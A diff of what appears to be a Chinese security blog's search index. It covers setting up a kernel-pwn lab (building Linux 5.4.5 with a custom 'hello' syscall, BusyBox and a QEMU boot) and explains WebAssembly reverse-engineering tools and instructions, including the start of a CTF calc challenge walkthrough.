+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>gcc</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://www.jianshu.com/p/2ddd32527367">如何使用内核API函数 proc_create?</a></li>
+<li><a href="https://blog.csdn.net/panhewu9919/article/details/99441712">linux内核漏洞利用初探（2）：demo-null_dereference</a></li>
+</ul>
+]]></content>
       <categories>
-          
-          <category> pwn </category>
-          
-          <category> kernel-pwn </category>
-          
+        <category>pwn</category>
+        <category>kernel-pwn</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>kernel-pwn之环境配置</title>
-      <link href="2021/05/07/kernel-pwn-zhi-huan-jing-pei-zhi/"/>
-      <url>2021/05/07/kernel-pwn-zhi-huan-jing-pei-zhi/</url>
-      
-        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">实验环境: Ubuntu 20.04 64位gcc版本: 9.3.0内核版本: 5.4.5BusyBox: 1.33.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="1-下载kernel源码"><a href="#1-下载kernel源码" class="headerlink" title="1. 下载kernel源码"></a>1. 下载kernel源码</h1><p>国内镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><pre class="line-numbers language-none"><code class="language-none">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v2.6/linux-5.4.5.tar.gz -O linux-5.4.5.tar.gztar -xvf linux-5.4.5.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-编译kernel"><a href="#2-编译kernel" class="headerlink" title="2. 编译kernel"></a>2. 编译kernel</h1><pre class="line-numbers language-none"><code class="language-none">cd linux-5.4.5/make menuconfigmake<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">问题1： make[1]: *** No rule to make target 'debian/certs/benh@debian.org.cert.pem', needed by 'certs/x509_certificate_list'。 停止。make[1]: *** 正在等待未完成的任务....  CC      certs/system_keyring.o  CC      kernel/groups.oMakefile:1002: recipe for target 'certs' failedmake: *** [certs] Error 2解决方案:打开.config文件，注释掉CONFIG_SYSTEM_TRUSTED_KEYS="debian/certs/benh@debian.org.cert.pem"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-增加syscall"><a href="#3-增加syscall" class="headerlink" title="3. 增加syscall"></a>3. 增加syscall</h1><h2 id="3-1-在syscall-table中添加信息"><a href="#3-1-在syscall-table中添加信息" class="headerlink" title="3.1. 在syscall table中添加信息"></a>3.1. 在syscall table中添加信息</h2><p>因为编译出来的内核是64位的，所以要在“./linux-5.4.5/arch/x86/entry/syscalls/syscall_64.tbl”中添加</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&lt;num&gt;    &lt;abi&gt;  &lt;name&gt;                    &lt;entry point&gt;436     common  hello                   __x64_sys_hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-增加syscall的宏"><a href="#3-2-增加syscall的宏" class="headerlink" title="3.2. 增加syscall的宏"></a>3.2. 增加syscall的宏</h2><p>在“linux-5.4.5/include/uapi/asm-generic/unistd.h”中修改：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define __NR_hello 436__SYSCALL(__NR_hello, sys_hello)#undef __NR_syscalls#define __NR_syscalls 437   //系统调用的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-添加函数定义"><a href="#3-3-添加函数定义" class="headerlink" title="3.3. 添加函数定义"></a>3.3. 添加函数定义</h2><p>在include/linux/syscalls.h中添加：    </p><pre class="line-numbers language-C" data-language="C"><code class="language-C">asmlinkage long sys_hello(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://blog.csdn.net/panhewu9919/article/details/99438304">asmlinkage</a>是一个宏，这里使用asmlinkage是因为syscall handler是汇编代码，而syscall routine是C代码，在使用syscall的时候是通过堆栈传递参数的，而asmlinkage的作用就是限定函数从堆栈中获取参数。</p><h2 id="3-4-编写函数代码"><a href="#3-4-编写函数代码" class="headerlink" title="3.4. 编写函数代码"></a>3.4. 编写函数代码</h2><p>在./kernel/sys.c中添加代码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE0</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Hello,my syscall.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-重新编译"><a href="#3-5-重新编译" class="headerlink" title="3.5. 重新编译"></a>3.5. 重新编译</h2><pre class="line-numbers language-none"><code class="language-none">make -j2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-安装busybox"><a href="#4-安装busybox" class="headerlink" title="4. 安装busybox"></a>4. 安装busybox</h1><h2 id="4-1-下载"><a href="#4-1-下载" class="headerlink" title="4.1. 下载"></a>4.1. 下载</h2><pre class="line-numbers language-none"><code class="language-none">wget https://busybox.net/downloads/busybox-1.33.1.tar.bz2 \&amp;&amp; tar -xjf busybox-1.33.1.tar.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-2-编译"><a href="#4-2-编译" class="headerlink" title="4.2. 编译"></a>4.2. 编译</h2><pre class="line-numbers language-none"><code class="language-none">make menuconfig   //Build Options，一定要选择Build static binary (no shared libs)，切记！！！makemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4-3-配置"><a href="#4-3-配置" class="headerlink" title="4.3. 配置"></a>4.3. 配置</h2><pre class="line-numbers language-none"><code class="language-none">cd _install mkdir -pv {bin,sbin,etc,proc,sys,usr/{bin,sbin}}# etc目录下创建inittab文件，文件内容如下：::sysinit:/etc/init.d/rcS   #指定初始化脚本::askfirst:-/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init# etc目录下mkdir init.d &amp;&amp; cd init.dtouch rcS# rcS内容#!/bin/shmount -t proc none /procmount -t sys none /sys/bin/mount -n -t sysfs none /sys/bin/mount -t ramfs none /dev/sbin/mdev -s    # We need this to find /dev/sda later# 配置dev目录mkdir devsudo mknod dev/ttyAMA0 c 204 64sudo mknod dev/null c 1 3sudo mknod dev/console c 5 1# 创建文件系统find . | cpio -o --format=newc &gt; ../rootfs2-1.img# 运行内核镜像qemu-system-x86_64 -kernel ./arch/x86/boot/bzImage -initrd ./rootfs2-1.img -append "root=/dev/ram rdinit=/sbin/init"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-测试系统调用"><a href="#5-测试系统调用" class="headerlink" title="5. 测试系统调用"></a>5. 测试系统调用</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">// test_sys_hello.c#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;#define __NR_hello 436 //系统调用号int main() {    printf("Prepare to call syscall hello.\n");    syscall(__NR_hello);    return 0;}// 编译,务必静态编译gcc test_sys_hello.c -o syshello -static  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的elf文件放到文件系统中，然后重新生成文件系统镜像，启动系统，运行。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://ctf-wiki.org/pwn/linux/kernel/basic_knowledge/">ctf-wiki</a></li><li><a href="https://github.com/bsauce/kernel-security-learning">https://github.com/bsauce/kernel-security-learning</a></li><li><a href="https://d1nn3r.github.io/2018/09/19/kernel-pwn/">https://d1nn3r.github.io/2018/09/19/kernel-pwn/</a></li></ol>]]></content>
-      
-      
+      <tags>
+        <tag>null-deference</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kernel-pwn之环境配置</title>
+    <url>/2021/05/07/kernel-pwn-zhi-huan-jing-pei-zhi/</url>
+    <content><![CDATA[<pre class="line-numbers language-none"><code class="language-none">实验环境: Ubuntu 20.04 64位
+gcc版本: 9.3.0
+内核版本: 5.4.5
+BusyBox: 1.33.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="1-下载kernel源码"><a href="#1-下载kernel源码" class="headerlink" title="1. 下载kernel源码"></a>1. 下载kernel源码</h1><p>国内镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p>
+<pre class="line-numbers language-none"><code class="language-none">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v2.6/linux-5.4.5.tar.gz -O linux-5.4.5.tar.gz
+tar -xvf linux-5.4.5.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="2-编译kernel"><a href="#2-编译kernel" class="headerlink" title="2. 编译kernel"></a>2. 编译kernel</h1><pre class="line-numbers language-none"><code class="language-none">cd linux-5.4.5/
+make menuconfig
+make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">问题1： 
+make[1]: *** No rule to make target 'debian/certs/benh@debian.org.cert.pem', needed by 'certs/x509_certificate_list'。 停止。
+make[1]: *** 正在等待未完成的任务....
+  CC      certs/system_keyring.o
+  CC      kernel/groups.o
+Makefile:1002: recipe for target 'certs' failed
+make: *** [certs] Error 2
+
+解决方案:
+打开.config文件，注释掉
+CONFIG_SYSTEM_TRUSTED_KEYS="debian/certs/benh@debian.org.cert.pem"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="3-增加syscall"><a href="#3-增加syscall" class="headerlink" title="3. 增加syscall"></a>3. 增加syscall</h1><h2 id="3-1-在syscall-table中添加信息"><a href="#3-1-在syscall-table中添加信息" class="headerlink" title="3.1. 在syscall table中添加信息"></a>3.1. 在syscall table中添加信息</h2><p>因为编译出来的内核是64位的，所以要在“./linux-5.4.5/arch/x86/entry/syscalls/syscall_64.tbl”中添加</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">&lt;num&gt;    &lt;abi&gt;  &lt;name&gt;                    &lt;entry point&gt;
+436     common  hello                   __x64_sys_hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="3-2-增加syscall的宏"><a href="#3-2-增加syscall的宏" class="headerlink" title="3.2. 增加syscall的宏"></a>3.2. 增加syscall的宏</h2><p>在“linux-5.4.5/include/uapi/asm-generic/unistd.h”中修改：</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">#define __NR_hello 436
+__SYSCALL(__NR_hello, sys_hello)
+
+#undef __NR_syscalls
+#define __NR_syscalls 437   //系统调用的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="3-3-添加函数定义"><a href="#3-3-添加函数定义" class="headerlink" title="3.3. 添加函数定义"></a>3.3. 添加函数定义</h2><p>在include/linux/syscalls.h中添加：    </p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">asmlinkage long sys_hello(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a href="https://blog.csdn.net/panhewu9919/article/details/99438304">asmlinkage</a>是一个宏，这里使用asmlinkage是因为syscall handler是汇编代码，而syscall routine是C代码，在使用syscall的时候是通过堆栈传递参数的，而asmlinkage的作用就是限定函数从堆栈中获取参数。</p>
+<h2 id="3-4-编写函数代码"><a href="#3-4-编写函数代码" class="headerlink" title="3.4. 编写函数代码"></a>3.4. 编写函数代码</h2><p>在./kernel/sys.c中添加代码:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE0</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Hello,my syscall.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="3-5-重新编译"><a href="#3-5-重新编译" class="headerlink" title="3.5. 重新编译"></a>3.5. 重新编译</h2><pre class="line-numbers language-none"><code class="language-none">make -j2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="4-安装busybox"><a href="#4-安装busybox" class="headerlink" title="4. 安装busybox"></a>4. 安装busybox</h1><h2 id="4-1-下载"><a href="#4-1-下载" class="headerlink" title="4.1. 下载"></a>4.1. 下载</h2><pre class="line-numbers language-none"><code class="language-none">wget https://busybox.net/downloads/busybox-1.33.1.tar.bz2 \
+&amp;&amp; tar -xjf busybox-1.33.1.tar.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="4-2-编译"><a href="#4-2-编译" class="headerlink" title="4.2. 编译"></a>4.2. 编译</h2><pre class="line-numbers language-none"><code class="language-none">make menuconfig   //Build Options，一定要选择Build static binary (no shared libs)，切记！！！
+make
+make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="4-3-配置"><a href="#4-3-配置" class="headerlink" title="4.3. 配置"></a>4.3. 配置</h2><pre class="line-numbers language-none"><code class="language-none">cd _install 
+mkdir -pv {bin,sbin,etc,proc,sys,usr/{bin,sbin}}
+
+# etc目录下创建inittab文件，文件内容如下：
+::sysinit:/etc/init.d/rcS   #指定初始化脚本
+::askfirst:-/bin/ash
+::ctrlaltdel:/sbin/reboot
+::shutdown:/sbin/swapoff -a
+::shutdown:/bin/umount -a -r
+::restart:/sbin/init
+
+# etc目录下
+mkdir init.d &amp;&amp; cd init.d
+touch rcS
+
+# rcS内容
+#!/bin/sh
+mount -t proc none /proc
+mount -t sys none /sys
+/bin/mount -n -t sysfs none /sys
+/bin/mount -t ramfs none /dev
+/sbin/mdev -s    # We need this to find /dev/sda later
+
+# 配置dev目录
+mkdir dev
+sudo mknod dev/ttyAMA0 c 204 64
+sudo mknod dev/null c 1 3
+sudo mknod dev/console c 5 1
+
+# 创建文件系统
+find . | cpio -o --format=newc &gt; ../rootfs2-1.img
+
+# 运行内核镜像
+qemu-system-x86_64 -kernel ./arch/x86/boot/bzImage -initrd ./rootfs2-1.img -append "root=/dev/ram rdinit=/sbin/init"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="5-测试系统调用"><a href="#5-测试系统调用" class="headerlink" title="5. 测试系统调用"></a>5. 测试系统调用</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">// test_sys_hello.c
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stdio.h&gt;
+#define __NR_hello 436 //系统调用号
+
+int main() {
+    printf("Prepare to call syscall hello.\n");
+    syscall(__NR_hello);
+    return 0;
+}
+
+// 编译,务必静态编译
+gcc test_sys_hello.c -o syshello -static  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将生成的elf文件放到文件系统中，然后重新生成文件系统镜像，启动系统，运行。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="https://ctf-wiki.org/pwn/linux/kernel/basic_knowledge/">ctf-wiki</a></li>
+<li><a href="https://github.com/bsauce/kernel-security-learning">https://github.com/bsauce/kernel-security-learning</a></li>
+<li><a href="https://d1nn3r.github.io/2018/09/19/kernel-pwn/">https://d1nn3r.github.io/2018/09/19/kernel-pwn/</a></li>
+</ol>
+]]></content>
       <categories>
-          
-          <category> pwn </category>
-          
-          <category> kernel-pwn </category>
-          
+        <category>pwn</category>
+        <category>kernel-pwn</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> kernel-pwn </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>wasm逆向分析方法</title>
-      <link href="2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/"/>
-      <url>2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/</url>
-      
-        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><blockquote><p>WebAssembly（缩写为Wasm）是基于堆栈的虚拟机的二进制指令格式。Wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。</p></blockquote><h1 id="2-WebAssembly文本格式"><a href="#2-WebAssembly文本格式" class="headerlink" title="2. WebAssembly文本格式"></a>2. WebAssembly文本格式</h1><h2 id="2-1-全局变量"><a href="#2-1-全局变量" class="headerlink" title="2.1. 全局变量"></a>2.1. 全局变量</h2><h3 id="2-1-1-global-get"><a href="#2-1-1-global-get" class="headerlink" title="2.1.1. global.get"></a>2.1.1. <code>global.get</code></h3><p>把全局变量的值推入栈顶。</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">global.get $global0且 global0 = d则有如下操作：|     |  ↘|  d  |      |  a  |    |  a  |   |  b  |    |  b  |   |  c  |    |  c  |      └─────┘    └─────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-2-global-set"><a href="#2-1-2-global-set" class="headerlink" title="2.1.2. global.set"></a>2.1.2. <code>global.set</code></h3><p>从栈顶弹出1个值，并将其设置为全局变量</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">global.set $global0则有如下操作：|  d  |↗  |     |      |  a  |    |  a  |   |  b  |    |  b  |      |  c  |    |  c  |      └─────┘    └─────┘，且global0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-局部变量"><a href="#2-2-局部变量" class="headerlink" title="2.2. 局部变量"></a>2.2. 局部变量</h2><h3 id="2-2-1-local-get"><a href="#2-2-1-local-get" class="headerlink" title="2.2.1. local.get"></a>2.2.1. <code>local.get</code></h3><p>类似<code>global.get</code>,不同之处是它将局部变量入栈。</p><h3 id="2-2-2-local-set"><a href="#2-2-2-local-set" class="headerlink" title="2.2.2. local.set"></a>2.2.2. <code>local.set</code></h3><p>类似<code>global.set</code>,不同之处是它将栈顶值弹出，并赋给1个局部变量。        </p><h3 id="2-2-3-local-tee"><a href="#2-2-3-local-tee" class="headerlink" title="2.2.3. local.tee"></a>2.2.3. <code>local.tee</code></h3><p>与<code>local.set</code>类似，但是它不会将栈顶值弹出。</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">local.tee $var0则有如下操作：|  d  |↗ ↘|  d  |      |  a  |    |  a  |   |  b  |    |  b  |      |  c  |    |  c  |      └─────┘    └─────┘，且var0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-内存操作"><a href="#2-3-内存操作" class="headerlink" title="2.3. 内存操作"></a>2.3. 内存操作</h2><h3 id="2-3-1-load"><a href="#2-3-1-load" class="headerlink" title="2.3.1. load"></a>2.3.1. <code>load</code></h3><p>以栈顶值为地址取数据</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">i64.load offset=88则有如下操作:|  d  |↗ ↘|M[d+88]|      |  a  |    |  a  |   |  b  |    |  b  |      |  c  |    |  c  |      └─────┘    └─────┘即将d出栈，将内存中d+88指向的1个64位数据入栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-store"><a href="#2-3-2-store" class="headerlink" title="2.3.2. store"></a>2.3.2. <code>store</code></h3><p>将栈顶值出栈，存到以下一个栈顶值为地址的内存中，即<code>M[stack[-2]] = stack[-1]</code></p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">local.get $var0local.get $var1i64.store| v[1]|↗  |     |      | v[0]|↗  |     |   |  b  |    |  b  |      |  c  |    |  c  |      └─────┘    └─────┘且M[v[0]] = v[1];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-4-函数调用"><a href="#2-4-函数调用" class="headerlink" title="2.4. 函数调用"></a>2.4. 函数调用</h2><h3 id="2-4-1-call"><a href="#2-4-1-call" class="headerlink" title="2.4.1. call"></a>2.4.1. <code>call</code></h3><p>函数的参数从左至右依次入栈，调用目标由立即数指定，调用结束以后参数全部出栈，返回值入栈(wasm1.0规定返回值至多有1个)</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">call $func6| p1  |↗  |     |      | p0  |↗  | ret |   |  b  |    |  b  |      |  c  |    |  c  |      └─────┘    └─────┘即调用函数func6(p0,p1),返回值为ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-5-wat文件格式解析"><a href="#2-5-wat文件格式解析" class="headerlink" title="2.5. .wat文件格式解析"></a>2.5. <code>.wat</code>文件格式解析</h2><h3 id="2-5-1-导入表"><a href="#2-5-1-导入表" class="headerlink" title="2.5.1. 导入表"></a>2.5.1. 导入表</h3><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">(import "a" "a" (func (;0;) (type 13)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即wasm导入了名为a的js模块中的a库函数，在js代码中的表现如下:</p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/importJS.png" class="">  <img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/asmLibraryArg.png" class=""><p>即wasm中func0实际上就是JS代码中的<code>___assert_fail</code>函数</p><h3 id="2-5-2-导出表"><a href="#2-5-2-导出表" class="headerlink" title="2.5.2. 导出表"></a>2.5.2. 导出表</h3><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即wasm将函数func27导出给JS调用，导出的函数名为"f"。</p><h3 id="2-5-3-数据段"><a href="#2-5-3-数据段" class="headerlink" title="2.5.3. 数据段"></a>2.5.3. 数据段</h3><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">(data (;0;) (i32.const 1024) "0077678b0f3e6cf6e263e6fe3a4c39f3\00length is not valid\00Success\00Oops....something wrong\00n &amp;&amp; \22n is null\22\00bn.c\00bignum_from_int\00bignum_from_string\00str &amp;&amp; \22str is null\22\00nbytes &gt; 0 &amp;&amp; \22nbytes must be positive\22\00(nbytes &amp; 1) == 0 &amp;&amp; \22string format must be in hex -&gt; equal number of bytes\22\00(nbytes % (sizeof(uint32_t) * 2)) == 0 &amp;&amp; \22string length must be a multiple of (sizeof(DTYPE) * 2) characters\22\00%8x\00bignum_to_string\00%.08x\00a &amp;&amp; \22a is null\22\00bignum_add\00b &amp;&amp; \22b is null\22\00c &amp;&amp; \22c is null\22\00bignum_mul\00bignum_cmp\00dst &amp;&amp; \22dst is null\22\00bignum_assign\00src &amp;&amp; \22src is null\22\00-+   0X0x\00(null)\00\00\11\00\0a\00\11\11\11\00\00\00\00\05\00\00\00\00\00\00\09\00\00\00\00\0b\00\00\00\00\00\00\00\00\11\00\0f\0a\11\11\11\03\0a\07\00\01\00\09\0b\0b\00\00\09\06\0b\00\00\0b\00\06\11\00\00\00\11\11\11")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即程序内存偏移为1024的地方，存放的数据为"0077678b0f3......"</p><h1 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3. 静态分析"></a>3. 静态分析</h1><h2 id="3-1-反汇编"><a href="#3-1-反汇编" class="headerlink" title="3.1. 反汇编"></a>3.1. 反汇编</h2><h3 id="3-1-1-ida自带WebAssembly插件-本人没用过"><a href="#3-1-1-ida自带WebAssembly插件-本人没用过" class="headerlink" title="3.1.1. ida自带WebAssembly插件(本人没用过)"></a>3.1.1. ida自带WebAssembly插件(本人没用过)</h3><h3 id="3-1-2-使用WABT"><a href="#3-1-2-使用WABT" class="headerlink" title="3.1.2. 使用WABT"></a>3.1.2. 使用<a href="https://github.com/WebAssembly/wabt">WABT</a></h3><pre class="line-numbers language-none"><code class="language-none">./wasm2wat test.wasm -o test.wat    //获取字节码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-反编译"><a href="#3-2-反编译" class="headerlink" title="3.2. 反编译"></a>3.2. 反编译</h2><h3 id="3-2-1-使用WABT"><a href="#3-2-1-使用WABT" class="headerlink" title="3.2.1. 使用WABT:"></a>3.2.1. 使用WABT:</h3><p><code>./wasm2c test.wasm -o test.c</code>     </p><p>得到<code>.c</code>文件和<code>.h</code>文件。<br>这一步得到的代码可读性仍然很差，光是行数也很吓人。</p><p>另外还可以使用wasm-decompiler:<br><code>./wasm-decompiler test.wasm</code><br>得到的是伪C代码，效果也不是很好。</p><h3 id="3-2-2-优化——gcc重新编译"><a href="#3-2-2-优化——gcc重新编译" class="headerlink" title="3.2.2. 优化——gcc重新编译"></a>3.2.2. 优化——gcc重新编译</h3><p>将wasm2c反编译得到的<code>.c</code>文件和<code>.h</code>文件和WABT中的<code>wasm-rt.h</code>放在一个文件夹下重新编译。</p><pre class="line-numbers language-none"><code class="language-none">gcc -c test.c -o test.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一步要注意，链接会出错(因为很多函数没有具体实现)，所以我们只生成目标文件即可。<br>到这里我们就得到了可以用ida分析的elf文件。</p><h1 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4. 动态分析"></a>4. 动态分析</h1><p>python搭建临时服务器</p><pre class="line-numbers language-none"><code class="language-none">python -m http.server &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后双击html文件，按<code>f12</code>，然后按<code>ctrl+r</code>即可开始调试     </p><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/wasm%E8%B0%83%E8%AF%95.png" class="" title="调试窗口">   <p>如图中右侧窗口所示，我们可以使用谷歌自带的wasm调试器设置断点、观察堆栈、局部变量、调用栈等信息。</p><h1 id="5-实战"><a href="#5-实战" class="headerlink" title="5. 实战"></a>5. 实战</h1><h2 id="5-1-2021蓝帽杯calc"><a href="#5-1-2021蓝帽杯calc" class="headerlink" title="5.1. 2021蓝帽杯calc"></a>5.1. 2021蓝帽杯calc</h2><h3 id="5-1-1-分析html和js代码"><a href="#5-1-1-分析html和js代码" class="headerlink" title="5.1.1 分析html和js代码"></a>5.1.1 分析html和js代码</h3><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E8%93%9D%E5%B8%BD%E6%9D%AFcalc_html%E9%A1%B5%E9%9D%A2.jpg" class="" title="html页面">    <p>主要判断逻辑在<code>check_input</code>函数中。 </p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;function check_input(){var e=document.getElementById("input_char").value;console.log(e);Module.ccall("entry","number",["string"],[e])}&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>该函数读取输入，并将输入作为ccall函数的参数。<br>js代码中ccall的定义如下：</p><pre class="line-numbers language-none"><code class="language-none">function ccall(ident, returnType, argTypes, args, opts) {    var toC = {        "string": function(str) {            var ret = 0;            if (str !== null &amp;&amp; str !== undefined &amp;&amp; str !== 0) {                var len = (str.length &lt;&lt; 2) + 1;                ret = stackAlloc(len);                stringToUTF8(str, ret, len)            }            return ret        },        "array": function(arr) {            var ret = stackAlloc(arr.length);            writeArrayToMemory(arr, ret);            return ret        }    };    function convertReturnValue(ret) {        if (returnType === "string") return UTF8ToString(ret);        if (returnType === "boolean") return Boolean(ret);        return ret    }    var func = getCFunc(ident);    var cArgs = [];    var stack = 0;    if (args) {        for (var i = 0; i &lt; args.length; i++) {            var converter = toC[argTypes[i]];            if (converter) {                if (stack === 0) stack = stackSave();                cArgs[i] = converter(args[i])            } else {                cArgs[i] = args[i]            }        }    }    var ret = func.apply(null, cArgs);    ret = convertReturnValue(ret);    if 